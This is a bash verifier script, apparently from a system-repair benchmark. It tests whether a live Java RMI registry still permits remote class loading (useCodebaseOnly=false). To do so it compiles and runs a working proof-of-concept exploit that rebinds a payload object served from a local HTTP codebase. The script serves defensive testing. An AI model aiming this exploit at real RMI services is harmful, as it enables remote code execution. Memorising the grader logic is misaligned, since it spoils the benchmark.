#!/bin/bash
# Scenario 33: Java RMI registry insecure default (useCodebaseOnly=false) ->
# unauthenticated remote class loading / RCE (CVE-2011-3556 class).
#
# BEHAVIOURAL verifier. It does NOT grep java.security (useCodebaseOnly is a JVM
# *system* property, not a security-properties entry, so a file edit proves
# nothing) and it does NOT read the boot script. Instead it runs the real
# exploit against the LIVE registry:
#   1. Stand up a local HTTP "codebase" server hosting a remote interface class
#      the registry does NOT have locally.
#   2. rebind() an object annotated with that codebase into the registry.
#   3. If the registry FETCHES the class over HTTP (a GET hits our server), it is
#      loading remote code from a client-supplied URL -> useCodebaseOnly=false ->
#      VULNERABLE.
# With useCodebaseOnly=true the registry refuses the annotation and never fetches.
#
# PoC checks:        the registry refuses to load a remote class from the
#                    client-supplied HTTP codebase (no PayloadIntf.class fetch)
# Regression checks: rmiregistry runs, listens on 1099, and still answers a
#                    legitimate list() call
#
# Exit 0 = every check passed, Exit 1 = at least one failed, Exit 42 = N/A.
#
# Two-component protocol: every check is recorded with its kind and NOTHING
# aborts early. See lib/verifylib.sh.
#
# UNREACHABILITY: "the registry refused the fetch" can only be read against a
# LIVE registry — a dead one simply never fetches. The PoC is gated on the
# registry answering a legitimate list(); a killed registry fails the regression
# instead. It is also gated on a POSITIVE CONTROL that the exploit's own HTTP
# codebase server is actually serving, so "no fetch" can never be a false pass
# caused by a broken control server. NOT CDR-eligible by robust design.

set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

HOST=127.0.0.1
PORT=1099
HTTP_PORT=18099
WORK=$(mktemp -d)
HTTP_PID=""
cleanup() { [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT

###############################################################################
# Regression: the registry must already be running. verify.sh must NEVER start it.
###############################################################################
if pgrep -f rmiregistry >/dev/null 2>&1; then
    record_reg rmiregistry_running 1
else
    record_reg rmiregistry_running 0 "rmiregistry is not running (verify.sh must not start it)"
fi

if netstat -ln 2>/dev/null | grep -qE ':1099( |$)'; then
    record_reg rmiregistry_listening 1
else
    record_reg rmiregistry_listening 0 "nothing listening on port 1099"
fi

###############################################################################
# Build the exploit + a legitimate client. javac is part of the vulnerable
# image's JDK; if the harness cannot compile at all the scenario is unmeasurable
# (a precondition skip, not a verdict).
###############################################################################
cat > "$WORK/PayloadIntf.java" <<'EOF'
import java.rmi.Remote; import java.rmi.RemoteException;
public interface PayloadIntf extends Remote { String go() throws RemoteException; }
EOF
cat > "$WORK/Payload.java" <<'EOF'
import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject;
public class Payload extends UnicastRemoteObject implements PayloadIntf {
    public Payload() throws RemoteException { super(); }
    public String go() { return "pwn"; }
}
EOF
cat > "$WORK/Attack.java" <<'EOF'
import java.rmi.registry.*;
public class Attack {
    public static void main(String[] a) {
        try {
            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
            r.rebind("evil", new Payload());
            System.out.println("REBIND_OK");
        } catch (Throwable t) {
            System.out.println("REBIND_ERR:" + t.getClass().getName());
        } finally { System.exit(0); }
    }
}
EOF
cat > "$WORK/Legit.java" <<'EOF'
import java.rmi.registry.*;
public class Legit {
    public static void main(String[] a) {
        try {
            Registry r = LocateRegistry.getRegistry(a[0], Integer.parseInt(a[1]));
            String[] n = r.list();
            System.out.println("LIST_OK:" + n.length);
        } catch (Throwable t) {
            System.out.println("LIST_ERR:" + t.getClass().getName());
        }
    }
}
EOF
if ! (cd "$WORK" && javac PayloadIntf.java Payload.java Attack.java Legit.java) 2>"$WORK/javac.err"; then
    skip_not_applicable "could not compile the exploit harness: $(tr '\n' ' ' < "$WORK/javac.err")"
fi

###############################################################################
# Regression: the registry must answer a legitimate list() before probing. This
# is the liveness witness — it fails when the registry is killed.
###############################################################################
UP=0
L=""
for i in $(seq 1 15); do
    L=$(cd "$WORK" && timeout 10 java -cp "$WORK" Legit "$HOST" "$PORT" 2>/dev/null) || true
    if echo "$L" | grep -q 'LIST_OK'; then UP=1; break; fi
    sleep 1
done

if [ "$UP" = "1" ]; then
    record_reg registry_serves_list 1
else
    record_reg registry_serves_list 0 "RMI registry did not answer a legitimate list() call — service down/broken; last=$L"
fi

###############################################################################
# PoC: force the registry to load a remote class from our HTTP codebase.
###############################################################################
if [ "$UP" = "1" ]; then
    mkdir -p "$WORK/httpdir"
    cp "$WORK/PayloadIntf.class" "$WORK/Payload.class" "$WORK/httpdir/"
    ( cd "$WORK/httpdir" && python -m SimpleHTTPServer "$HTTP_PORT" >"$WORK/http.log" 2>&1 ) &
    HTTP_PID=$!

    # POSITIVE CONTROL: the codebase HTTP server MUST actually be bound and
    # serving before "no class fetch" can be read as "safe". Fire a control GET at
    # a SENTINEL path and require the server to log it.
    SENTINEL="__cb_probe_$$__"
    CB_UP=0
    for i in $(seq 1 15); do
        python - "$HTTP_PORT" "$SENTINEL" >/dev/null 2>&1 <<'PY'
import sys, urllib
port = sys.argv[1]; sentinel = sys.argv[2]
try:
    urllib.urlopen('http://127.0.0.1:%s/%s' % (port, sentinel)).read()
except Exception:
    pass
PY
        if grep -q "$SENTINEL" "$WORK/http.log" 2>/dev/null; then CB_UP=1; break; fi
        sleep 1
    done

    if [ "$CB_UP" = "1" ]; then
        ( cd "$WORK" && timeout 25 java -cp "$WORK" \
            -Djava.rmi.server.codebase="http://127.0.0.1:${HTTP_PORT}/" \
            Attack "$HOST" "$PORT" >"$WORK/attack.out" 2>&1 ) || true
        sleep 2

        if grep -q 'PayloadIntf.class' "$WORK/http.log" 2>/dev/null; then
            record_poc remote_class_load_refused 0 \
                "registry fetched a remote class over HTTP from a client-supplied codebase (useCodebaseOnly=false) — remote class loading / RCE live: $(grep 'PayloadIntf.class' "$WORK/http.log" | head -1)"
        else
            record_poc remote_class_load_refused 1
        fi
    else
        echo "  [SKIP] (poc) remote_class_load_refused: the exploit's HTTP codebase server"
        echo "         never bound port ${HTTP_PORT} (no control GET logged), so 'no fetch'"
        echo "         cannot be trusted. Left unrecorded rather than falsely passed."
    fi
else
    echo "  [SKIP] (poc) remote_class_load_refused: the registry is unreachable, so it"
    echo "         never fetches — 'no fetch' would be indistinguishable from a dead"
    echo "         registry. Left unrecorded; the killed service fails the regression."
fi

verify_finish
